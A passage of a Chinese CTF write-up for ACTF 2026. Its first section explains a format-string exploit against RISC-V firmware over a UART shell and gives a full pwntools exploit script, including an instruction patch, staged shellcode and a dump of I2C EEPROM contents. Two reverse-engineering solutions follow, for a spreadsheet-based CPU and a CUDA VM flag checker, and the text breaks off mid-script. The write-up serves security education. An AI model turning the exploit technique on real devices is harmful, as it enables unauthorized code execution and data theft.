固件启动后给一个 UART shell：

```Plain
Type `exit' to exit.
< 
```

#### **漏洞点**

shell 读入最多 63 字节一行，非 `exit` 命令会直接执行：

```C
printf(buf);
```

因此存在格式串漏洞。

远程实测在精确发送 63 字节、最后一个字节为 `0x20` 时，`printf` 的第 7 个参数会变成 `0x20000000`。这个地址处的代码会在 `exit` 路径里被间接调用。

于是用 `%hn` 把 `0x20000000` 的低半字改成 `0xa0a5`：

```Python
patch = b"%41120c" + b"%c" * 5 + b"%hn"
patch += b"A" * (62 - len(patch)) + b" "
```

`0xa0a5` 是 RISC-V compressed 指令：

```Assembly
c.j 0x20000068
```

也就是让 `exit` 路径跳到 UART DMA ring buffer 起始位置执行 shellcode。

#### **利用流**

1. 连接远程，提交 token 和 PoW。
2. 利用格式串把 `0x20000000` patch 成 `c.j 0x20000068`。
3. 发送 63 个 NUL，让 128 字节 DMA ring 对齐。
4. 发送 `\x00\x00 + stage1 + \n`，把 stage1 放到 `0x20000068`。
5. 发送 `exit`，固件执行：

```Plain
0x20000000 -> c.j 0x20000068 -> stage1
```

1. stage1 将 loader 复制到安全 RAM，再读取 stage2。
2. stage2 初始化 I2C1，读取 AT24C64 前 128 字节并通过 UART 输出。
3. 输出里直接得到 flag。

#### **I2C 读取参数**

stage2 使用硬件 I2C，而不是 bitbang：

```Plain
RCC_APB2PCENR |= 0x11          # AFIO + GPIOC
RCC_APB1PCENR |= 0x00200000    # I2C1
GPIOC_CFGLR    = 0x44444ff4    # PC1/PC2 AF open-drain
I2C1 base      = 0x40005400
CTLR2          = 48
CKCFGR         = 240
RTR            = 49
EEPROM addr    = 0x50
```

读取流程是标准 AT24C64 random read：

```Plain
START -> 0xa0 -> addr_hi -> addr_lo -> RESTART -> 0xa1 -> read byte
```

EXP：

```Python
#!/usr/bin/env python3
from pwn import *
import hashlib
import os
import re
import time

HOST = os.getenv("HOST", "1.95.116.62")
PORT = int(os.getenv("PORT", "10001"))
TOKEN = os.getenv("TOKEN", "aa6e7905645cf11892979ab4f2d1b252").encode()
DUMP_LEN = int(os.getenv("DUMP_LEN", "128"), 0)
context.log_level = os.getenv("LOG", "info")

STAGE1 = bytes.fromhex(
    "970200009382e20237030020130383121306c00383c602002300d300850205037d166dfab7020020938282128282130520059302403f8292370400201304042093046021a28526869302805182927dd92a94898ce5f81305c0049302403f8292b7020020938202208282"
)
STAGE2 = bytes.fromhex(
    "13053005d52ab712024083a782014547d98f23acf20083a7c20137072000d98f23aef200b7120140b7574444d11723a0f200994723a8f2003754004013040440a1672310f400c92223100400930700032312f4009307000f231ef400930710032310f40285472310f4001305400569228144268501284922850493070008e39af4fe01a0411106c626c402c2aa8485472310f40013052006fd208317040093e707102310f4001305300785454d209307000a2318f4001305100689454928835744018357840193d7840093f7f70f1305800793050008a5282318f40093f7f40f13059007930500089d202318f4001305a0079145a9288317040093e707102310f40013053005854599209307100a2318f4001305100489451d2885472310f4008357440183578401930710202310f40013052007930500041928035504011375f50fb240a2440320410041018280411106c62ac4b703020003564401b376b60085e2fd13e39a03fe1305500471202245612003554401a12003558401892001a0b24041018280411106c62ac4b7030200035684019376260085c2fd13e39a03fe1305500491282245812803554401012803558401292001a0b24041018280411106c626c4aa84130500023d20314333d564003d89a9476345f5001305750519a0130505031ac0092802437113e35103feb240a24441018280611106c29302403f8292924021018280856393838338fd13e39f03fe8280"
)

def solve_pow(suffix: bytes, bits: int) -> bytes:
    mask = (1 << bits) - 1
    i = 0
    t0 = time.time()
    while True:
        x = str(i).encode()
        if int.from_bytes(hashlib.sha256(x + suffix).digest(), "big") & mask == 0:
            log.info("pow=%d %.2fs", i, time.time() - t0)
            return x
        i += 1

def connect_shell():
    io = remote(HOST, PORT, timeout=20)
    io.recvuntil(b"< ")
    io.sendline(TOKEN)
    while True:
        s = io.recvuntil(b"< ", timeout=180)
        m = re.search(rb"sha256\(\? \+ '([^']+)'\)` ends with (\d+) binary 0s", s)
        if m:
            io.sendline(solve_pow(m.group(1), int(m.group(2))))
        elif b"Type `agree'" in s:
            io.sendline(b"agree")
        elif b"Type `exit' to exit." in s:
            return io

def wait_prompt(io, name, need=None):
    buf = b""
    end = time.time() + 40
    while time.time() < end:
        part = io.recvuntil(b"< ", timeout=max(0.5, end - time.time()))
        if not part:
            break
        buf += part
        if need is None or need in buf:
            return buf
    raise RuntimeError(f"timeout waiting {name}: {buf[-80:]!r}")

def main():
    assert len(STAGE1) < 123 and b"\n" not in STAGE1

    io = connect_shell()
    time.sleep(0.2)
    io.clean(timeout=0.2)

    # printf(buf) 格式串：第 7 个参数在精确 63 字节输入时可控为 0x20000000；
    # 写 0xa0a5，即 c.j 0x20000068，让 exit 路径跳到 UART DMA ring 中的 stage1。
    patch = b"%41120c" + b"%c" * 5 + b"%hn"
    patch += b"A" * (62 - len(patch)) + b" "
    io.send(patch)
    wait_prompt(io, "patch", b"AAAAAAAAAAAAAAAA")

    # 对齐 128 字节 DMA ring，使后续 stage1 落在 0x20000068。
    io.send(b"\x00" * 63)
    wait_prompt(io, "filler", b"> < ")

    # stage1 复制内嵌 loader 到安全 RAM；loader 打印 R 后读取原始 stage2。
    io.send(b"\x00\x00" + STAGE1 + b"\n")
    wait_prompt(io, "stage1 head", b"> < ")
    if len(STAGE1) + 2 > 63:
        wait_prompt(io, "stage1 tail", b"> ")

    io.send(b"exit\n")
    io.recvuntil(b"see ya\n", timeout=10)
    io.recvuntil(b"R", timeout=10)
    for i in range(0, len(STAGE2), 16):
        io.send(STAGE2[i : i + 16])
        time.sleep(0.02)
    io.recvuntil(b"L", timeout=10)
    io.recvuntil(b"S", timeout=10)
    io.recvuntil(b"T", timeout=10)

    data = io.recvn(DUMP_LEN, timeout=90)
    m = re.search(rb"ACTF\{[^}]+\}", data)
    if not m:
        print(data)
        raise SystemExit("flag not found")
    print(m.group(0).decode())

if __name__ == "__main__":
    main()
```

## Reverse

### ？！计算机系统贯通实验！？

对xlsx文件进行zip解压，`workbook.xml` 里有一个很重要的设置：

```Plain
<calcPr calcId="191029" iterate="1" iterateCount="1"/>
```

这说明工作簿开启了迭代计算，而且每次只迭代一次。结合表格里提示的 `Click F9 til you find something interesting`，可以判断每按一次 F9 表格公式就推进一步状态。

`sheet1.xml` 里能看到几个醒目的区域：

- `F4` 是输入 flag 的位置，默认内容是 `ACTF{flag}`。
- `I` 列是一大段十六进制，看起来像指令区。
- `J` 列保存寄存器状态。
- `K` 列是初始化内存，`L` 列是运行时内存。
- `C` 列负责取指、译码、执行。
- `F10` 会把输出字符拼起来。

相关公式摘出来后，`C6` 的取指逻辑最关键：

```Plain
HEX2DEC(INDEX(I:I, C5)) - 11462713 * C4/4 - 918823512
```

其中 `C4` 是 PC，`C5=C4/4+2`，所以 `I` 列保存的是经过线性混淆的指令。还原公式为：

```Plain
ins = (int(I[row], 16) - 11462713 * (pc // 4) - 918823512) & 0xffffffff
```

随后 `C8` 到 `C13` 拆 opcode、rd、funct3、rs1、rs2、funct7，整体结构和 RV32I 非常接近，只是 opcode 被替换过。

公式里能直接读出几类指令的 opcode：

![](img/ACTF2026/image (2).png)

把 opcode 映射回标准 RV32I 后，可以用 `llvm-objdump` 反汇编，也可以直接写模拟器跑。程序入口处先向 `0x10000000` 写入 `Hi` ，表格中 store 到这个地址会把低 8 位字符追加到 `F10`。随后跳到主函数。

主函数地址大约在 `0x1a78`，运行默认输入会输出：

```Plain
Hi
begin init
Checking flag
I hate General Physics, but sys make me fun. Anyway, you got a WRONG flag.
```

说明程序确实在做 flag 校验，而不是单纯隐藏字符串。

反汇编后主函数里有几段明显的校验，每段只负责 flag 的一部分。直接逆每段比爆破整串简单很多。

第一段：

`0x1bb0` 附近会拷贝前 35 字节，然后对前 `0x1f` 字节做变换：

```Plain
x = ((flag[i] ^ 0x37) + 0x2f) & 0xff;
```

变换后的 35 字节会和内存 `0x454c` 的表比较。逆运算就是：

```Plain
flag[i] = ((target[i] - 0x2f) & 0xff) ^ 0x37
```

后面 4 字节未经过这个变换，直接取表中原值。得到：

```Plain
ACTF{do-u-love-General-Physics-(H)?
```

第二段：自定义Base64

主函数调用 `0x1900(flag + 0x23, alphabet, 0x1c)`，说明从偏移 `0x23` 开始取 28 字节做编码。编码函数在 `0x1774`，是标准 Base64 结构，只是 alphabet 不是固定表。

alphabet 先从 `0x4114` 处的普通表读取：

```Plain
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-/=
```

随后函数 `0x19d0` 按下面公式生成 64 字节新 alphabet：

```Plain
perm[i] = src_alpha[(37 * i + 47) & 0x3f]第三段：CRC32 + 变种 hash 的相邻字符约束
```

目标串在 `0x4044`：

```Plain
JJY+ndsVry-wWNA9MJYcg5Y0WSIwWi8Ir+rOG-==
```

把目标串从自定义 alphabet 翻译回标准 Base64 后解码，得到：

```Plain
I-cann0t-love-it-anymore233-
```

此时已恢复到 flag 偏移 63。

第三段：CRC32 + 变种 hash 的相邻字符约束

从偏移 `0x3f` 到 `0x51` 有一个循环。每次循环会修改字符串 `expand 32-byte k` 的部分字节，并把 `flag[i]`、`flag[i+1]` 放到固定位置，再计算一个 hash。目标值从 `0x416c` 开始，一共 19 个 dword。

hash 函数在 `0x77c`，逻辑如下：

```Plain
def h77c(buf):
    h = 0x811c9dc5
    for b in buf:
        if b == 0:
            break
        h ^= b
        h = ((h >> 25) + ((h << 7) & 0xffffffff)) & 0xffffffff
        h = (h + ((h << 13) & 0xffffffff)) & 0xffffffff
        h = (h ^ (h >> 5)) & 0xffffffff
    return h
```

因为每次只涉及相邻两个未知字符，可以对可打印字符枚举 `(flag[i], flag[i+1])`，再用相邻约束串起来。最终唯一解为：

```Plain
15c077f9-631f-44d8-b
```

这段看起来是 UUID 的前半部分。

第四段：AES-like 16 字节块

最后一段取 `flag + 0x53` 的 16 字节，送进函数 `0x838`，再和 `0x41b8` 的 16 字节密文比较：

```Plain
03 81 f5 43 bc 80 c4 0f 8b 35 d4 37 f1 39 35 96
```

`0x838` 是一个 AES-like 变换：

- 先把明文块异或两个 16 字节 key。
- 进行 7 轮变换。
- 每轮有 S-box、ShiftRows、前 6 轮有 MixColumns。
- MixColumns 使用的 GF 多项式不是 AES 常见的 `0x1b`，而是 `0x1d`。
- RoundKey 来自已经被第三段循环改过的 `expand 32-byte k`。

直接把这 7 轮反过来即可恢复最后 16 字节。逆出来的内容是：

```Plain
826-af6c60f15e4f
```

前面第三段的结尾是 `...-b`，拼起来正好补完整个 UUID：

```Plain
15c077f9-631f-44d8-b826-af6c60f15e4f
```

程序实际只校验前 99 字节，标准 ACTF flag 需要手动补上最后的 `}`。

Exp:

```Python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Solver for ACTF ?! sys1-lab7 !?
Usage: python3 solve_sys1_lab7.py challenge.zip
The script only uses Python standard library.
"""
import base64
import io
import re
import string
import sys
import zipfile
import xml.etree.ElementTree as ET

NS = "{http://schemas.openxmlformats.org/spreadsheetml/2006/main}"


def u32(x: int) -> int:
    return x & 0xffffffff


def read_xlsx_from_outer(path: str) -> bytes:
    with zipfile.ZipFile(path, "r") as zf:
        names = zf.namelist()
        xlsx = [n for n in names if n.lower().endswith(".xlsx")]
        if not xlsx:
            raise RuntimeError("no xlsx found in outer zip")
        return zf.read(xlsx[0])


def load_cells(xlsx_bytes: bytes) -> dict[str, str]:
    with zipfile.ZipFile(io.BytesIO(xlsx_bytes), "r") as zf:
        # shared strings
        sst_root = ET.fromstring(zf.read("xl/sharedStrings.xml"))
        shared = []
        for si in sst_root.findall(NS + "si"):
            shared.append("".join(t.text or "" for t in si.iter(NS + "t")))

        sheet_root = ET.fromstring(zf.read("xl/worksheets/sheet1.xml"))
        cells = {}
        for c in sheet_root.iter(NS + "c"):
            ref = c.attrib.get("r")
            if not ref:
                continue
            v = c.find(NS + "v")
            val = v.text if v is not None and v.text is not None else ""
            typ = c.attrib.get("t", "")
            if typ == "s" and val != "":
                val = shared[int(val)]
            elif typ == "inlineStr":
                val = "".join(t.text or "" for t in c.iter(NS + "t"))
            cells[ref] = val
        return cells


def build_memory(cells: dict[str, str]) -> dict[int, int]:
    mem = {}
    for ref, val in cells.items():
        m = re.fullmatch(r"K(\d+)", ref)
        if not m:
            continue
        if not re.fullmatch(r"[0-9a-fA-F]+", val or ""):
            continue
        row = int(m.group(1))
        mem[(row - 2) * 4] = int(val, 16) & 0xffffffff
    return mem


def mem_bytes(mem: dict[int, int], addr: int, size: int) -> bytes:
    out = bytearray()
    for a in range(addr, addr + size):
        w = mem.get((a // 4) * 4, 0)
        out.append((w >> ((a & 3) * 8)) & 0xff)
    return bytes(out)


def recover_part0(mem: dict[int, int]) -> bytes:
    # target table at 0x454c. 0..0x1e bytes are checked as ((flag[i] ^ 0x37) + 0x2f) & 0xff
    target = mem_bytes(mem, 0x454c, 35)
    out = []
    for i, b in enumerate(target):
        if i <= 0x1e:
            out.append(((b - 0x2f) & 0xff) ^ 0x37)
        else:
            out.append(b)
    return bytes(out)


def recover_part1(mem: dict[int, int]) -> bytes:
    src_alpha = mem_bytes(mem, 0x4114, 0x43).split(b"\0")[0]
    perm = bytes(src_alpha[((37 * i + 47) & 0x3f)] for i in range(64))
    target = mem_bytes(mem, 0x4044, 40).split(b"\0")[0]
    std = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    trans = bytes.maketrans(perm, std)
    return base64.b64decode(target.translate(trans))


def h77c(buf: bytes) -> int:
    h = 0x811c9dc5
    for b in buf:
        if b == 0:
            break
        h = u32(h ^ b)
        h = u32((h >> 25) + ((h << 7) & 0xffffffff))
        h = u32(h + ((h << 13) & 0xffffffff))
        h = u32(h ^ (h >> 5))
    return h


def recover_part2(mem: dict[int, int], known_prefix: bytes) -> bytes:
    state = bytearray(mem_bytes(mem, 0x4158, 17))  # "expand 32-byte k\0"
    targets = [int.from_bytes(mem_bytes(mem, 0x416c + 4 * i, 4), "little") for i in range(19)]

    alphabet = (string.ascii_letters + string.digits + string.punctuation + " ").encode()
    constraints = []
    for n, pos in enumerate(range(0x3f, 0x52)):
        state[pos % 6] = pos & 0xff
        pairs = []
        for a in alphabet:
            for b in alphabet:
                tmp = bytearray(state)
                tmp[12] = a
                tmp[13] = b
                if h77c(bytes(tmp)) == targets[n]:
                    pairs.append(bytes([a, b]))
        if not pairs:
            raise RuntimeError(f"no pair found at position {pos}")
        constraints.append(pairs)

    seqs = constraints[0]
    for pairs in constraints[1:]:
        seqs = [s + p[1:] for s in seqs for p in pairs if s[-1:] == p[:1]]
        if not seqs:
            raise RuntimeError("adjacent-pair chain broken")
    if len(seqs) != 1:
        raise RuntimeError(f"ambiguous part2: {seqs!r}")
    return seqs[0]


def xtime(x: int) -> int:
    x &= 0xff
    return ((x << 1) & 0xff) ^ (0x1d if x & 0x80 else 0)


def gf_mul(a: int, b: int) -> int:
    a &= 0xff
    b &= 0xff
    res = 0
    while b:
        if b & 1:
            res ^= a
        b >>= 1
        a = xtime(a)
    return res & 0xff


def gf_pow(a: int, n: int) -> int:
    r = 1
    while n:
        if n & 1:
            r = gf_mul(r, a)
        a = gf_mul(a, a)
        n >>= 1
    return r


def invert_mix_matrix() -> list[list[int]]:
    mat = [[2, 3, 1, 1], [1, 2, 3, 1], [1, 1, 2, 3], [3, 1, 1, 2]]
    a = [row[:] + [1 if i == j else 0 for j in range(4)] for i, row in enumerate(mat)]
    for col in range(4):
        piv = next(r for r in range(col, 4) if a[r][col])
        a[col], a[piv] = a[piv], a[col]
        inv_p = gf_pow(a[col][col], 254)
        a[col] = [gf_mul(x, inv_p) for x in a[col]]
        for r in range(4):
            if r == col:
                continue
            factor = a[r][col]
            if factor:
                a[r] = [a[r][c] ^ gf_mul(factor, a[col][c]) for c in range(8)]
    return [row[4:] for row in a]


INV_MIX = invert_mix_matrix()


def inv_mix_col(col: list[int]) -> list[int]:
    return [
        gf_mul(INV_MIX[i][0], col[0]) ^ gf_mul(INV_MIX[i][1], col[1]) ^
        gf_mul(INV_MIX[i][2], col[2]) ^ gf_mul(INV_MIX[i][3], col[3])
        for i in range(4)
    ]


def recover_part3(mem: dict[int, int], known: bytes) -> bytes:
    key1 = bytearray(mem_bytes(mem, 0x4158, 17))
    for pos in range(0x3f, 0x52):
        key1[pos % 6] = pos & 0xff
        key1[12] = known[pos]
        key1[13] = known[pos + 1]
    key1 = bytes(key1[:16])
    key2 = known[:16]
    ct = mem_bytes(mem, 0x41b8, 16)

    sbox = mem_bytes(mem, 0x4570, 256)
    inv_sbox = [0] * 256
    for i, b in enumerate(sbox):
        inv_sbox[b] = i

    def round_key(r: int) -> bytes:
        sh = (r & 3) + 3
        c = (1 << (r % 10)) & 0xff
        if r > 7:
            c ^= 0x1b
        return bytes((((b << sh) & 0xff) ^ c) for b in key1)

    st = list(ct)
    for r in range(6, -1, -1):
        rk = round_key(r)
        st = [x ^ rk[i] for i, x in enumerate(st)]

        if r <= 5:
            for base in range(0, 16, 4):
                st[base:base + 4] = inv_mix_col(st[base:base + 4])

        old = st[:]
        # inverse ShiftRows
        st[1], st[5], st[9], st[13] = old[13], old[1], old[5], old[9]
        st[2], st[6], st[10], st[14] = old[10], old[14], old[2], old[6]
        st[3], st[7], st[11], st[15] = old[7], old[11], old[15], old[3]
        st = [inv_sbox[x] for x in st]

    return bytes(st[i] ^ key1[i] ^ key2[i] for i in range(16))


def solve(path: str) -> str:
    xlsx = read_xlsx_from_outer(path)
    cells = load_cells(xlsx)
    mem = build_memory(cells)

    part0 = recover_part0(mem)
    part1 = recover_part1(mem)
    part2 = recover_part2(mem, part0 + part1)
    part3 = recover_part3(mem, part0 + part1 + part2)

    # The checker consumes the first 99 bytes. The conventional ACTF wrapper needs the trailing brace.
    return (part0 + part1 + part2 + part3 + b"}").decode()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <challenge.zip>", file=sys.stderr)
        sys.exit(1)
    print(solve(sys.argv[1]))
```

### VirtualNPU

附件是一个 Windows x64 PE，带了 CUDA fatbin。先看一下文件和字符串：

```Plain
$ file virtualnpu.exe
virtualnpu.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 8 sections

$ strings -a virtualnpu.exe | grep -E "VirtualNPU|SALT|Correct|Wrong|npu|AES"
VirtualNPU Flag Verifier
Enter the flag:
VirtualNPU_2026_SALT
Correct!
Wrong!
_Z16npu_cycle_kernelPhPjjPyS0_
AES_SBOX
nvcuda.dll
nvcudart_hybrid64.dll
```

程序表面流程很简单：读取 flag，调用 CUDA kernel 跑校验，返回值为 0 时输出 `Correct!`，否则输出 `Wrong!`。

关键点有两个：

1. 真正的校验逻辑不直接明文放在 `.text`，而是放在 `.rdata` 中一段加密 VM bytecode；
2. CUDA kernel 名为 *`Z16npu_cycle_kernelPhPjjPyS0`*，里面解释执行这段 bytecode，所以题目名叫 VirtualNPU。

PE 节区大致如下：

```Plain
Idx Name      Size      VMA               File off
0   .text     00019670  0000000140001000  00000400
1   .rdata    0001009e  000000014001b000  00019c00
4   .nv_fatb  000641b8  0000000140039000  0002c200
```

在 `main` 附近可以看到，程序先申请 `0x3000` 字节内存，然后把 `.rdata` 里的 `0x3000` 字节复制过去：

```Plain
1400015d3  mov     ecx, 3000h
140001608  call    malloc_like
140001613  mov     r8d, 3000h
140001618  lea     rdx, [rip+19EA1h] ; 14001B4C0
14000161f  mov     rcx, rax
140001622  call    memcpy_like
```

`.rdata` 的原始文件偏移为 `0x19c00`，VMA 为 `0x14001b000`，所以 VA `0x14001b4c0` 对应文件偏移：

```Plain
0x19c00 + (0x14001b4c0 - 0x14001b000) = 0x1a0c0
```

也就是说，加密 bytecode 位于：

```Plain
offset = 0x1a0c0
size   = 0x3000
```

附近还能看到字符串和 salt：

```Plain
0001d0c0  VirtualNPU Flag Verifier
0001d0e0  Enter the flag:
0001d128  VirtualNPU_2026_SALT
0001d150  Correct!
0001d160  Wrong!
```

bytecode 不是直接使用，进入 kernel 前会先在 CPU 侧解密。解密算法是 RC4，并且丢弃了前 `0x200` 字节 keystream。

salt 为： VirtualNPU_2026_SALT

key 不是直接用 salt，而是由 salt 字节异或两组 mask 拼出 32 字节：

```Plain
salt = b"VirtualNPU_2026_SALT"

mask1 = [
    0x00, 0x37, 0x6e, 0xa5, 0xdc, 0x13, 0x4a, 0x81,
    0xb8, 0xef, 0x26, 0x5d, 0x94, 0xcb, 0x02, 0x39,
    0x70, 0xa7, 0xde, 0x15,
]

mask2 = [
    0x4c, 0x83, 0xba, 0xf1, 0x28, 0x5f,
    0x96, 0xcd, 0x04, 0x3b, 0x72, 0xa9,
]

key = bytes([salt[i] ^ mask1[i] for i in range(20)] +
            [salt[i] ^ mask2[i] for i in range(12)])
```

得到的 RC4 key 为：

```Plain
565e1cd1a97226cfe8ba796fa4f9346623e692411aeac8855d3efa83546e2d9b
```

解密时先做 KSA，然后 PRGA 丢弃 512 字节，再对 `0x3000` 字节 bytecode 异或：

```Python
def rc4(data: bytes, key: bytes, drop: int = 0x200) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i & 31]) & 0xff
        s[i], s[j] = s[j], s[i]

    i = j = 0

    for _ in range(drop):
        i = (i + 1) & 0xff
        j = (j + s[i]) & 0xff
        s[i], s[j] = s[j], s[i]
        _ = s[(s[i] + s[j]) & 0xff]

    out = bytearray()
    for c in data:
        i = (i + 1) & 0xff
        j = (j + s[i]) & 0xff
        s[i], s[j] = s[j], s[i]
        out.append(c ^ s[(s[i] + s[j]) & 0xff])
    return bytes(out)
```

解出来的前几条指令如下，可以明显看到是定长 16 字节指令，实际有效字段集中在前 4 字节：

```Plain
000: 0d 00 c0 05 00 00 00 00 00 00 00 00 00 00 00 00
001: ff 00 c0 06 00 00 00 00 00 00 00 00 00 00 00 00
002: 41 31 40 0c 00 00 00 00 00 00 00 00 00 00 00 00
003: 26 59 60 04 00 00 00 00 00 00 00 00 00 00 00 00
004: 00 18 42 30 00 00 00 00 00 00 00 00 00 00 00 00
005: 00 00 62 ec 00 00 00 00 00 00 00 00 00 00 00 00
```

CUDA kernel 里维护一块大内存，bytecode 以 16 字节一条指令解释执行。指令前 4 字节可以按下面这种方式拆：

```Plain
b0: imm / index / low operand
b1: src / modifier
b2: dst / address class
b3: opcode
```

单步跟 kernel 后能得到大致指令含义：

```YAML
0x05: mov imm8, dst
0x06: mov imm8, dst，常用于初始化 mask
0x9d: store / load 索引类操作
0xec: 读输入字符
0x44: xor / add 混合
0x34: 查表准备
0x91: 下标相关操作
0x2d: 从 AES_SBOX 取值
0x35: 写回变换结果
0xc5: 比较变换结果和目标常量
0xfc: 设置最终返回状态
```

bytecode 里先初始化 AES S-box。比如从第 349 条开始能看到标准 AES S-box 的开头：

```YAML
349: 63 00 20 05
350: 7c 00 40 05
353: 77 00 20 05
354: 7b 00 40 05
357: f2 00 20 05
358: 6b 00 40 05
361: 6f 00 20 05
362: c5 00 40 05
365: 30 00 20 05
366: 01 00 40 05
```

对应 AES S-box：

```Plain
63 7c 77 7b f2 6b 6f c5 30 01 ...
```

随后 VM 对输入逐字节处理。题目给的 flag 格式是：

```Plain
ACTF{[0-9a-f]{32}}
```

所以长度固定为 38 字节。bytecode 里也有 38 组读输入、查 S-box、比较的重复结构。

把 VM 的重复指令块整理后，每一位都是独立校验，可以化简成：

```Plain
AES_SBOX[input[i] ^ k[i]] == target[i]
```

其中 `target` 直接来自 bytecode 后半段的比较常量。对应位置如下，每组 `mov target` 后面跟一个 `cmp`，提取出的目标数组为：

```Plain
target = [
    0x2a, 0xb9, 0x81, 0x8a, 0xf1, 0xf4, 0xee, 0x89,
    0xd0, 0xa2, 0x0d, 0x71, 0x76, 0xac, 0xf9, 0x4f,
    0x20, 0x31, 0x1b, 0x70, 0xc7, 0x7e, 0x50, 0x35,
    0x80, 0x54, 0xe6, 0x2f, 0xe9, 0xc8, 0x93, 0x1f,
    0x84, 0x85, 0xcc, 0x7a, 0xdb, 0xd5,
]
```

`k` 是 VM 中每个字符位置参与异或的常量，单步整理后的结果如下：

```Plain
k = [
    0xd4, 0x98, 0xc5, 0x89, 0x50, 0x8e, 0xae, 0xc2,
    0x01, 0x2e, 0xc0, 0x1c, 0x36, 0x98, 0x58, 0xa7,
    0x62, 0x4c, 0x25, 0xb2, 0x55, 0xbd, 0x58, 0xed,
    0x0a, 0xc5, 0xc2, 0x7e, 0xd9, 0x88, 0x47, 0xff,
    0x29, 0x5e, 0x15, 0x84, 0xa8, 0xc8,
]
```

反推时只需要对 AES S-box 取逆：

```Plain
input[i] = AES_INV[target[i]] ^ k[i]
```

Exp:

```Python
#!/usr/bin/env python3
from pathlib import Path

EXE = "virtualnpu.exe"
BYTECODE_OFF = 0x1A0C0
BYTECODE_SIZE = 0x3000

AES_SBOX = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,
    0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,
    0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,
    0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,
    0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,
    0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,
    0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,
    0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,
    0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,
    0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,
    0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,
]

K = [
    0xd4, 0x98, 0xc5, 0x89, 0x50, 0x8e, 0xae, 0xc2,
    0x01, 0x2e, 0xc0, 0x1c, 0x36, 0x98, 0x58, 0xa7,
    0x62, 0x4c, 0x25, 0xb2, 0x55, 0xbd, 0x58, 0xed,
    0x0a, 0xc5, 0xc2, 0x7e, 0xd9, 0x88, 0x47, 0xff,
    0x29, 0x5e, 0x15, 0x84, 0xa8, 0xc8,
]


def build_key() -> bytes:
    salt = b"VirtualNPU_2026_SALT"
    mask1 = [
        0x00, 0x37, 0x6e, 0xa5, 0xdc, 0x13, 0x4a, 0x81,
        0xb8, 0xef, 0x26, 0x5d, 0x94, 0xcb, 0x02, 0x39,
        0x70, 0xa7, 0xde, 0x15,
    ]
    mask2 = [
        0x4c, 0x83, 0xba, 0xf1, 0x28, 0x5f,
        0x96, 0xcd, 0x04, 0x3b, 0x72, 0xa9,
    ]
    return bytes([salt[i] ^ mask1[i] for i in range(20)] +
                 [salt[i] ^ mask2[i] for i in range(12)])


def rc4(data: bytes, key: bytes, drop: int = 0x200) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i & 31]) & 0xff
        s[i], s[j] = s[j], s[i]

    i = j = 0
    for _ in range(drop):
        i = (i + 1) & 0xff
        j = (j + s[i]) & 0xff
        s[i], s[j] = s[j], s[i]
        _ = s[(s[i] + s[j]) & 0xff]

    out = bytearray()
    for c in data:
        i = (i + 1) & 0xff
        j = (j + s[i]) & 0xff
        s[i], s[j] = s[j], s[i]
        out.append(c ^ s[(s[i] + s[j]) & 0xff])
    return bytes(out)


def extract_targets(bytecode: bytes) -> list[int]:
    # 比较区的结构为：
    #   xx 04 60 91      ; 选择第 xx 位
    #   tt 00 80 05      ; 写入 target 常量 tt
    #   aa 00 6c c5      ; cmp
    # 每 4 条指令一组，目标常量在第 611、615、619... 条。
    targets = []
    for insn_idx in range(611, 760, 4):
        ins = bytecode[insn_idx * 16: insn_idx * 16 + 4]
